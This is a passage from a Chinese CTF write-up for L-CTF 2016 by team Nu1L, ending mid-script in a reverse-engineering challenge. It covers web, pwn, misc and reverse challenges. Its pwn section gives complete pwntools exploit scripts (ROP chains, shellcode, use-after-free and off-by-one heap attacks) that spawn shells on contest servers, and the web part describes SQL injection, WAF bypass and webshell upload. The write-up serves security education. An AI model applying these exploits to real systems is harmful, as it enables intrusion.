> 原文链接: https://www.anquanke.com//post/id/84669 


# 【CTF攻略】最新2016 L-CTF writeup


                                阅读量   
                                **213711**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t016616b811fac2b5b1.jpg)](https://p4.ssl.qhimg.com/t016616b811fac2b5b1.jpg)

作者：Nu1L** **

稿费：700RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

2016 第一届全国网络安全对抗赛(L-CTF)解题报告

队伍：**Nu1L**



**web**

****

**签到题**

过滤了相关字符，and,select,updatexml双写绕过就好，空格用/**/代替，拿到密码we1c0me%_#2&amp;_@LCTF。进去之后发现任意提交passwd提示密码不对，让num=0，passwd=5487即可。

**我控几不主我及几啦**

虽然说写了waf，但是sqlmap照样能过XD。各种tamper加上就好了：

**[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t015e49b09a864f0555.png)**

****

**苏达学姐的网站**

题目一共分为三步

第一步是一个正则绕过：

题目的正则应该是^php://.*resource=(.*$这种形式，而且第一步应该先会检测是否是图片，于双次绕过就好了:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016ea3c17cab260197.png)



再读一下file/admin.php.txt：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0102bcdcd89f5b60cc.png)



熟悉的CBC字节翻转攻击：

**[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0170cf7436e15f65f0.png)**

****

拿到cookie之后，登录进去发现是一个上传页面，测试后发现可以上传ini文件，于是通过上传.user.ini文件，getshell，菜刀连上发现flag：

****[![](https://p0.ssl.qhimg.com/t01d2115c682034bea9.png)](https://p0.ssl.qhimg.com/t01d2115c682034bea9.png)

**睡过了**

前几天刚爆出来的漏洞，关于magic函数wakeup在反序列化数据时，如果属性过多导致wakup失效，具体文章可以自己找下。利用+号以及修改属性值绕过，最后利用glob绕过open_basedir，在/var/www/flag目录下发现flag：

[![](https://p3.ssl.qhimg.com/t015f640ecf27b9ebef.png)](https://p3.ssl.qhimg.com/t015f640ecf27b9ebef.png)

**headpic**

感觉学到很多的一个题目：

首先是二次盲注，我们发现随意注册一个用户进入之后会有修改用户头像的地方，而主办方放的提示是二次注入，猜测修改头像时，会把用户名带入查询，如果查询错误，头像返回就是空，如果不是，则头像返回就会有长度，于是利用mid函数就可以了，py小脚本上一发：

[![](https://p4.ssl.qhimg.com/t01566b56c3196ef1f1.png)](https://p4.ssl.qhimg.com/t01566b56c3196ef1f1.png)

得到用户密码：1d5afc15d99fe43fb602b25f3b5d2ee0

Cmd5解密是1admin2016

然后fuzz下目录，发现有admin.php以及robots.txt，用户更换图片地方存在ssrf（但是没什么用?不过能看源码）：

主办方提示了比较函数，而直接admin账户登录是显示账户错误的，于是user[]数组绕过即可，最后拿到flag：

[![](https://p0.ssl.qhimg.com/t01fa8c0cf48495601c.png)](https://p0.ssl.qhimg.com/t01fa8c0cf48495601c.png)



**你一定不能来这**

比较好玩的一个题目，虽然最后看运气，首先fuzz下目录，发现：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018b8b3451c66397de.png)



然后访问下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01399621e6b3f42b5d.png)

下载下download.php:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0170ef6eeeab569e53.png)

Hash长度扩展攻击，利用py下的hashpumpy爆破下secert的长度就可以了：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0126eb135e9069d073.png)



得到长度是18：

    [![](https://p5.ssl.qhimg.com/t019c2f59c9b2730e26.png)](https://p5.ssl.qhimg.com/t019c2f59c9b2730e26.png)

然后下载www.rar，发现有密码QAQ，hex编辑器打开在最后发现jjencode代码，github上有解密的脚本：



[![](https://p5.ssl.qhimg.com/t01f50eb91a1ff4d382.png)](https://p5.ssl.qhimg.com/t01f50eb91a1ff4d382.png)

YoU CAN gET Some INterESted Thing If You CAN deCOde Me In tImE.

培根密码：XXDDCCTTFF

拿到源码之后，没有什么逻辑，就是爆破time时间戳与rand随机数1-10000结合之后的md5：

[![](https://p1.ssl.qhimg.com/t01e5a2afeeab349859.png)](https://p1.ssl.qhimg.com/t01e5a2afeeab349859.png)

于是burp或者自己写多线程脚本跑就好了：

[![](https://p1.ssl.qhimg.com/t01fc2607b568abfe6b.png)](https://p1.ssl.qhimg.com/t01fc2607b568abfe6b.png)



要注意，抓包获得的时间并不是东八区北京时间，所以需要加8才能算对，感谢主办方后期心疼我们改了时间，要不然根本出不来= =



**Pwn**

****

****

**Pwn100**

很明显的栈溢出，然后就是构造ROP，泄露libc地址，调用system(“/bin/sh”)

```
from pwn import *
DEBUG = 0
if DEBUG:
    context.log_level = 'debug'
    io = process('./pwn100')
    gdb.attach(io)
else:
    io = remote('119.28.63.211', 2332)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn100')
puts_got_addr = elf.got['puts']
read_got_addr = elf.got['read']
puts_plt_addr = elf.symbols['puts']
read_plt_addr = elf.symbols['read']
pop_rdi_ret_addr = 0x0000000000400763
pop_rsi_pop_r15_ret_addr = 0x0000000000400761
pop_pop_pop_pop_ret_addr = 0x000000000040075d
rsp = 0x00601300
payload = 'A' * 0x40 + 'B' * 0x8 + p64(pop_rdi_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr)
payload += p64(pop_rdi_ret_addr) + p64(read_got_addr) + p64(puts_plt_addr)
payload += p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_pop_r15_ret_addr) + p64(rsp) + p64(1) + p64(read_plt_addr)
payload += p64(pop_pop_pop_pop_ret_addr) + p64(rsp)
payload = payload.ljust(0xC8, 'A')
raw_input('go?')
io.send(payload)
io.recvline()
libc_puts_addr = u64(io.recvline()[:6] + 'x00x00')
libc_read_addr = u64(io.recvline()[:6] + 'x00x00')
libc_base_addr = libc_puts_addr - 0x00070c70
libc_system_addr = libc_base_addr + 0x000468f0
bin_sh_addr = libc_base_addr + 0x0017dbc5
# libc_system_addr = libc_puts_addr - (libc.symbols['puts'] - libc.symbols['system'])
# bin_sh_addr = libc_puts_addr - (libc.symbols['puts'] - next(libc.search('/bin/sh')))
log.info('libc_puts_addr:%s' % hex(libc_puts_addr))
log.info('libc_read_addr:%s' % hex(libc_read_addr))
payload2 = p64(1) * 3
payload2 += p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(libc_system_addr)
io.sendline(payload2)
io.interactive()
```



**Pwn200**

首先IDA静态分析，400A8E函数存在一个栈地址泄漏

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0173cd6704e6081f66.jpg)

继续分析程序流程，在4007DF处发现输入的ID第一位为0时直接结束该函数执行然后去执行400A29，该函数中有strcpy存在很明显的栈溢出。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0126eb627b7c2da527.jpg)

又因40096D中调用free，所以直接将shellcode起始地址覆盖free_plt，调用free时直接开sh:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014de678f698f46b7b.jpg)

```
#!/usr/bin/env python
 
from pwn import *
 
DEBUG = 0
 
if DEBUG:
    p = process('./pwn2003sw54ed65rf7t')
else:
    p = remote('119.28.63.211', 2333)
 
#pwntools shellcraft
shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')
 
#some address
free_plt = 0x0000000000602018
 
def pwn():
    p.recvuntil('who are u?n')
    p.send(shellcode.ljust(48))
    p.recvuntil(shellcode.ljust(48))
    
    leak_addr = u64(p.recvn(6).ljust(8, 'x00'))
    shellcode_addr = leak_addr - 0x50
    print 'shellcode addr: ' + hex(shellcode_addr)
 
    p.recvuntil('give me your id ~~?n')
    p.sendline('0')
    p.recvuntil('give me money~n')
 
    payload = p64(shellcode_addr).ljust(56, 'x00') + p64(free_plt)
    p.send(payload)
    
    p.sendline('2')
 
    p.interactive()
 
if __name__ == '__main__':
    pwn()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013a36fa5541d217af.jpg)



**Pwn300**

拿到程序运行发现缺少lib，readelf看一下发现程序需要两个特殊的库: libio和libgetshell，用ida分析可以很轻松找到栈溢出，利用栈溢出将libgetshell dump下来看到一个名为getshell的函数，跳到那里就可以拿shell。

脚本：

```
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
from hexdump import hexdump
import os, sys

# switches
DEBUG = 0
LOCAL = 0
VERBOSE = 1

# modify this
if LOCAL:
    io = process('./pwn300kh6y5gt3treg')
else:
    io = remote('119.28.63.211',2339)

if VERBOSE: context(log_level='debug')
# define symbols and offsets here

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

def limu8(x):
    return c_uint8(x).value

def limu16(x):
    return c_uint16(x).value

def limu32(x):
    return c_uint32(x).value

# define interactive functions here

def recursive():
    for i in xrange(10):
        ru('fuck me!n')
        payload = 40 * 'a' + p64(0x4004a9)
        sn(payload.ljust(0xa0))
    return

def leak(addr, length=40):
    ru('fuck me!n')
    pad = 40 * 'A'
    pop6 = 0x40049e
    callframe = 0x400484
    write_got = 0x601018
    payload = pad + p64(pop6) + p64(write_got) + p64(length) + p64(addr) + p64(1) + p64(callframe) + p64(0) * 7 + p64(0x4004A9)
    print len(payload)
    assert len(payload) &lt;= 0xa0
    sn(payload.ljust(0xa0))
    return ra(length)

# define exploit function here
def pwn():
    if DEBUG: gdb.attach(io)
    recursive()
    dynelf = DynELF(leak, elf=ELF("./pwn300kh6y5gt3treg"))
    #r = leak(0x601018)
    #hexdump(r)
    libgetshell = dynelf.lookup(None, "libgetshell")
    getshell = dynelf.lookup('getshell', 'libgetshell')
    
    info("Libgetshell = " + hex(libgetshell))
    info("Getshell = " + hex(getshell))

    ru('fuck me!n')
    payload = 40 * 'a' + p64(getshell)
    sn(payload.ljust(0xa0))
    '''
    f = open('libgetshell.dump', 'wb')
    while 1:
        f.write(leak(libgetshell, 0x1000))
        libgetshell += 0x1000
    '''

    io.interactive()
    return

if __name__ == '__main__':
    pwn()
```



**Pwn400**

一个C++写的rsa加解密程序，在解密的时候可以泄露keypair(在堆上)的地址，同时解密完后会有uaf。在堆上构造fake vtable，uaf占位即可。

脚本：

```
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
from hexdump import hexdump
import os, sys

# switches
DEBUG = 0
LOCAL = 0
VERBOSE = 1

# modify this
if LOCAL:
    io = process('./pwn400')
else:
    io = remote('119.28.62.216',10023)

if VERBOSE: context(log_level='debug')
# define symbols and offsets here

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

def limu8(x):
    return c_uint8(x).value

def limu16(x):
    return c_uint16(x).value

def limu32(x):
    return c_uint32(x).value

# define interactive functions here
def menu():
    return ru('exitn')

def addcipher(keychain='0',p=3,q=5):
    menu()
    sl('1')
    ru('Non')
    sl(keychain)
    if keychain == '1':
        ru('p:')
        sl(str(p))
        ru('q:')
        sl(str(q))
    return

def encrypt(length,data):
    menu()
    sl('2')
    ru(')n')
    sl(str(length))
    ru('n')
    sn(data)
    return

def decrypt(length,data):
    menu()
    sl('3')
    ru(')n')
    sl(str(length))
    ru('textn')
    sn(data)
    return

def comment(data):
    menu()
    sl('4')
    ru('RSA')
    sn(data)
    return

# define exploit function here
def pwn():
    if DEBUG: gdb.attach(io)
    addcipher(keychain='1')
    encrypt(64, 64*'a')
    ru(': ')
    rn(512)
    heapleak = u64(ru('n')[:-1].ljust(8,'x00'))
    heap = heapleak - 0x270
    info("Heap Leak = " + hex(heap))
    decrypt(64, 128*'0')    # uaf
    fake_vtable = heap + 0x40
    payload = p64(fake_vtable) + 5 * p64(1) + p64(0xdeadbeef) * 4 + p64(0x0000000000401245) + p64(0x401245)
    payload = payload.ljust(128)
    comment(payload)
    poprdi = 0x0000000000402343
    ropchain = p64(poprdi)
    ropchain += p64(0x604018)
    ropchain += p64(0x400BE0)
    ropchain += p64(0x401D9D)   # back to main
    decrypt(256,ropchain.ljust(512))
    offset___libc_start_main_ret = 0x21ec5
    offset_system = 0x00000000000468f0
    offset_dup2 = 0x00000000000ece70
    offset_read = 0x00000000000ec690
    offset_write = 0x00000000000ec6f0
    offset_str_bin_sh = 0x17dbc5
    '''
    offset___libc_start_main_ret = 0x21f45
    offset_system = 0x0000000000046590
    offset_dup2 = 0x00000000000ebe90
    offset_read = 0x00000000000eb6a0
    offset_write = 0x00000000000eb700
    offset_str_bin_sh = 0x17c8c3
    '''
    #offset_printf = 0x0000000000054340
    offset_printf = 0x00000000000546b0
    libc = u64(rn(6).ljust(8, 'x00')) - offset_printf
    info("Libc = " + hex(libc))
    ropchain = p64(poprdi)
    ropchain += p64(libc + offset_str_bin_sh)
    ropchain += p64(libc + offset_system)
    decrypt(256, ropchain.ljust(512))
    io.interactive()
    return

if __name__ == '__main__':
    pwn()
```



 

**Pwn500**

漏洞点在读入固定长度内容时有nullbyte off-by-one。利用方式和google project zero的[https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html](https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html) 这篇文章相似，通过伪造prev_size和in_use位来达到chunk overlapping的效果。具体利用见脚本：

```
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
import os, sys

os.environ['LD_PRELOAD'] = './libc_xd.so'

# switches
DEBUG = 0
LOCAL = 0
VERBOSE = 1

# modify this
if LOCAL:
    io = process('./pwn500')
else:
    io = remote('119.28.62.216',10024)

if VERBOSE: context(log_level='debug')
# define symbols and offsets here

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

def limu8(x):
    return c_uint8(x).value

def limu16(x):
    return c_uint16(x).value

def limu32(x):
    return c_uint32(x).value

# define interactive functions here
def enterGame(char='y'):
    ru('n)?n')
    sl(char)
    return

def menu():
    return ru(':')

def senderinfo(name,contact):
    menu()
    sl('1')
    ru('?')
    sn(name)
    ru('?')
    sn(contact)
    return

def submitpack():
    menu()
    sl('6')
    return

def showrcvr():
    menu()
    sl('5')
    return

def deletercvr(index):
    menu()
    sl('4')
    ru('?')
    sl(str(index))
    return

def newrcvr():
    menu()
    sl('2')
    return

def setReceiver(name,postcode,contact,address):
    menu()
    sl('1')
    ru('?')
    sn(name)
    ru('?')
    sn(postcode)
    ru('?')
    sn(contact)
    ru('?')
    sn(address)
    return

def newPackage(length, data):
    menu()
    sl('2')
    ru('?')
    sl(str(length))
    ru('~')
    sn(data)
    return

def savePackage():
    menu()
    sl('5')
    return

def exitAddRecv():
    menu()
    sl('6')
    return

def deletePackage(index):
    menu()
    sl('3')
    ru('?')
    sl(str(index))
    return

def editrcvr(index,name,postcode,contact,address):
    menu()
    sl('3')
    ru('?')
    sl(str(index))
    ru('?')
    sn(name)
    ru('?')
    sn(postcode)
    ru('?')
    sn(contact)
    ru('?')
    sn(address)
    return

# define exploit function here
def pwn():
    if DEBUG: gdb.attach(io)
    enterGame()

    senderinfo('1n', '1n')
    newrcvr()
    setReceiver('1n', '1n', '1n', '1n')
    newPackage(160, 'a'.ljust(159,'a')+'n')
    newPackage(160, 'b'.ljust(159,'b')+'n')
    newPackage(160, 'c'.ljust(159,'c')+'n')
    newPackage(8, 'padn')  # sep
    newPackage(160, 'd'.ljust(159,'d')+'n')
    newPackage(224, 'e'.ljust(223,'e')+'n')
    #newPackage(160, 'fn')
    deletePackage(2)
    deletePackage(1)
    savePackage()

    newrcvr()
    setReceiver('2n', '2n', '2n', '2n')     # take original 2
    newPackage(160, 'x'*152 + p64(816))    # take 1, off by one
    deletePackage(3)            # delete 3
    deletePackage(3)            # wild chunk overlap
    savePackage()

    newrcvr()
    exitAddRecv()

    newrcvr()
    setReceiver('3n', '3n', '3n', '3n')
    newPackage(0x1f0, 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAA' + p64(0x602ff0) + p64(0x0) + 'n')
    exitAddRecv()

    editrcvr(0, '1n', '1n', '1n', '/bin/sh;n')
    showrcvr()
    for i in xrange(2):     ru('address:')
    addr = u64(rn(6).ljust(8,'x00')) - 0x00000000000ec690
    info("Libc leak = " + hex(addr))
    system = addr + 0x468f0
    read = addr + 0xec690
    editrcvr(1, '1n', '1n', p64(system)[:-1] + 'n', p64(read)[:-1] + 'n')
    editrcvr(0, 'xn', 'xn', 'xn', 'xn')

    io.interactive()
    return
if __name__ == '__main__':
    pwn()
```



 

**Misc**

****

**Misc150**

ntfs流提取出一个zip压缩包，把最后部分的空白那几行去掉0d 0a，然后LSB每7位表示一个字节，得到flag为6d3677dd

**challenge_how_many_Vigenère**

提示是维吉尼亚密码，而且没给秘钥，gg下找到一个爆破网址：

[https://www.guballa.de/vigenere-solver，秘钥长度3-120：](https://www.guballa.de/vigenere-solver)

[![](https://p5.ssl.qhimg.com/t012d0096e477147efa.png)](https://p5.ssl.qhimg.com/t012d0096e477147efa.png)



得到明文：

```
Aliceleavestheteapartyandentersthegardenwhereshecomesuponthreelivingplayingcardspaintingthewhiterosesonarosetreeredbecausethequeenofheartshateswhiterosesaprocessionofmorecardskingsandqueensandeventhewhiterabbitentersthegardenalicethenmeetsthekingandqueenthequeenafiguredifficulttopleaseintroduceshertrademarkphraseoffwithhisheadwhichsheuttersattheslightestdissatisfactionwithasubjectaliceisinvitedorsomemightsayorderedtoplayagameofcroquetwiththequeenandtherestofhersubjectsbutthegamequicklydescendsintochaosliveflamingosareusedasmalletsandhedgehogsasballsandaliceonceagainmeetsthecheshirecatthequeenofheartsthenordersthecattobebeheadedonlytohaveherexecutionercomplainthatthisisimpossiblesincetheheadisallthatcanbeseenofhimbecausethecatbelongstotheduchessthequeenispromptedtoreleasetheduchessfromprisontoresolvethematter
```

gg下，发现是（爱丽丝梦游仙境?）：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011d2e7f505f63b6b6.png)

根据题目要求进行加密得到flag。

**easy100**

动态调试发现加密密钥为htsii__sht_eek.y，然后aes加密，加密后的字符为`{`21, -93, -68, -94, 86, 117, -19, -68,-92, 33, 50, 118, 16, 13, 1, -15, -13, 3, 4, 103, -18, 81, 30, 68, 54, -93, 44, -23,93, 98, 5, 59`}`，解密出来即是flag。

**Easyeasy200**

So里面检测了调试环境，patch检测的字符串即可绕过，点击的button被隐藏了，在右下角，绕过反调试后后动态调试下发现取出输入的5-38位后进行逆置，对逆置的字符串进行base64编码后和dHR0dGlldmFodG5vZGllc3VhY2VibGxlaHNhdG5hd2k进行比较，解密出来再逆置回去即是flag：iwantashellbecauseidonthaveitttt

**Misc400**

流量中发现攻击者首先利用proftpd的一个洞上传了webshell然后反弹shell了一个4444端口。利用4444端口的shell写了一个新的webshell进来。然后利用新的webshell下载了两个图片文件。

两个图片文件异或后获得一个python脚本。

```
import sys
key = '******************'
flag = 'AES_key`{`***************`}`'
 
if len(key) % 2 == 1:
    print("Key Length Error")
    sys.exit(1)
 
n = len(key) / 2
encrypted = ''
for c in flag:
    c = ord(c)
    for a, b in zip(key[0:n], key[n:2*n]):
        c = (ord(a) * c + ord(b)) % 251
    encrypted += '%02x' % c
 
print encrypted
 
#encrypt="cc90b9054ca67557813694276ab54c67aa93092ec87dd7b539"
```

用一个脚本解出AES_key

```
m="cc90b9054ca67557813694276ab54c67aa93092ec87dd7b539"
def process(a,b,m):
    return "".join(map(chr,map(lambda x: (x*a+b)%251,map(ord,m.decode('hex')))))
for i in xrange(255):
    for j in xrange(255):
        if "AES_key`{`" in process(i,j,m):
            print process(i,j,m)
#AES_key`{`FK4Lidk7TwNmRWQd`}`
```

关于原理可以看下的MMACTF 2016的Super Express

然后发现一段奇怪的DNS请求，将数据取出然后用上面算出的aeskey解密。

```
#!/usr/bin/env python
# encoding:utf-8
__author__ = 'albertchang'
 
from Crypto.Cipher import AES
from Crypto import Random
import base64
 
 
def decrypt(data, password):
    unpad = lambda s: s[0:-ord(s[-1])]
    iv = data[:16]
    cipher = AES.new(password, AES.MODE_CBC, iv)
    data = cipher.decrypt(data[16:])
    return data
 
if __name__ == '__main__':
    password = 'FK4Lidk7TwNmRWQd'
    encrypt_data1 = base64.b64decode(
        'OYzmTh2MGNclc5gALl+2lJ/xu58d4dAtidJc2w4dRhB1cuh/pXAt17QSjEIFMPiSE6w+DXpXJk9zm0FD39MGvwL4ZNpr2YndIPnjnb0W3xNeP+e5r//GhTYkNTdPo4xpT4d+HMihDB1mZNcQ8Gib69l5NlqC8PFjEeABWPfJezqG0LozsEjukHJOCMhVlRrirtkI7/ExFZAgH+G1i/gaw84nJ0DbGXQEpA2wySh6/iXeJD1ZYgt7jRgKLCL6CGggxsAEP9+m3QTZkxEitNqplA==')
    encrypt_data2 = base64.b64decode(
        'Mvw3nE7h3GtoC0xqGKmjboBW7h+WyH+QhJRd1EL+Qc7cgRAaVNYwWrWDMByHOIlSig+MvEg0GTihcnuNdgRpD4fgmEgjvAvScqJkQUes+Mxbi4NNkCv6YANnbGFbZSUVs3YbulPu6Xzj+/nBmJcOsti94BHja8Cjym4l2qpmIkjR6kONAs2e7uAkduLR1zH9')
    decrypt_data1 = decrypt(encrypt_data1, password)
    print 'decrypt_data1:n', decrypt_data1
    decrypt_data2 = decrypt(encrypt_data2, password)
    print 'decrypt_data2:n', decrypt_data2
```

得到

Please submit the used ftp CVE ID like "CVE********"and LCTF`{`A11_1n_0ne_Pcap`}` as your flag.eg."CVE12345678A11_1n_0ne_Pcap"

搜到[https://www.exploit-db.com/exploits/36803/](https://www.exploit-db.com/exploits/36803/)

故CVE20153306A11_1n_0ne_Pcap

<br>

**Reverse**

****

****

**Re100**

用ida可以看到程序不停的使用QMetaObject的activate方法来调用其它的函数。由于对Qt不太熟我选择在各关键函数上下断点看call stack，一层层追溯回去可以找到加密的地方，写出对应的解密代码。（解密得到的flag最后不知道为啥有几位是不可见字符，不过根据其它位置可以猜出来…）

脚本：

```
#!/usr/bin/env python2
# -*- coding:utf-8 -*-

from ctypes import *
from hexdump import hexdump

iv = 'Cirno'

def ror8(x,bits):
    r = (((x &gt;&gt; bits) &amp; 0xff) | ( x &lt;&lt; (8-bits))) &amp; 0xff
    return r

def dexor_2(data):
    g = []
    for i in xrange(5):
        t = ord(data[i])
        k = ord(iv[i])
        g.append(ror8(t^k,4))
    return ''.join(map(lambda x:chr(x), g))

def dexor_1(data,key):
    g = []
    for i in xrange(5):
        t = ord(data[i])
        k = ord(key[i])
        g.append(t^k)
    return ''.join(map(lambda x:chr(x), g))

encdata = '''
D9 EF 31 06 88 D6 00 62
B1 07 48 6A 73 80 18 01
D9 D2 75 08 25 01 18 BF
FC 26 8C 85 83 76 12 31
BA C6 98
'''.replace('n','').replace(' ','').decode('hex')

hexdump(encdata)

s = ''

for i in xrange(6):
    k = dexor_2(encdata[30-5*i:35-5*i])
    k = dexor_1(k,encdata[25-5*i:30-5*i])
    s = k + s
    print k

print s
print dexor_2(encdata[0:5])

hexdump(s)
hexdump(dexor_2(encdata[0:5]))

# flag = 'LCTF`{`Th4nk_y0u_f0r_play1ng_th1s_gam3`}`'
```

Re200

程序最后一步是维吉尼亚加密，把密文仍到[https://www.guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver) 里得到密钥ieedcpgdhkedddfenkfaifgggcgbbbgf，然后根据程序对原始密钥的转换过程得到原始密钥

byte_804A440 = 0

byte_804A441= 0

```
def process0():
    global byte_804A440
    global byte_804A441
    v0 = byte_804A441 &amp; 0xF0 | byte_804A440 &amp; 0xF
    byte_804A440 = (byte_804A440 &amp; 0xF0 | byte_804A441 &amp; 0xF) ^ 0x99
    byte_804A441 = v0 ^ 0x55

def process1():
    global byte_804A440
    global byte_804A441
    byte_804A440 ^= byte_804A441
    v0 = byte_804A441 &gt;&gt; 4
    byte_804A441 = v0 | (16 * byte_804A441 &amp; 0xFF)

def process2():
    global byte_804A440
    global byte_804A441
    v0 = byte_804A440 &gt;&gt; 4
    byte_804A440 = (16 * byte_804A441 &amp; 0xFF) | (byte_804A440 &amp; 0xF)
    byte_804A441 = v0 | byte_804A441 &amp; 0xF0

def process3():
    global byte_804A440
    global byte_804A441
    byte_804A440 ^= 16 * byte_804A440 &amp; 0xFF
    byte_804A441 ^= 16 * byte_804A441 &amp; 0xFF

def generate(key):
    global byte_804A440
    global byte_804A441
    if (len(key) &amp; 1) == 1:
        key += 'x53'
    key2 = []
    key3 = []
    cipher = []
    for i in range(0, len(key), 2):
        byte_804A440 = ord(key[i])
